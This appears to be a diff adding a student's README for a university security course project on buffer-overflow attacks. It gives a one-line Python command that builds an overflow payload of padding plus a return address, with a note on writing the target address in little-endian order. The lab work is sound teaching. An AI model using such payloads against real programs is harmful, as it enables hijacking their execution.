@@ -1,0 +1,14 @@
+Henry Chen
+CS 458 - Project 3: Bufferoverflow Attack
+
+Script was tested on Ubuntu:
+
+$python -c ‘print “\x41” * 141 + “\xAA\xAA\xAA\xAA” ‘ >> input
+
+Please replace these four 'AA' in the later half of the code with the address of the target function 
+in little endian.
+
+For example
+
+0x08048f04 -> \x04\x8f\x04\x08
+
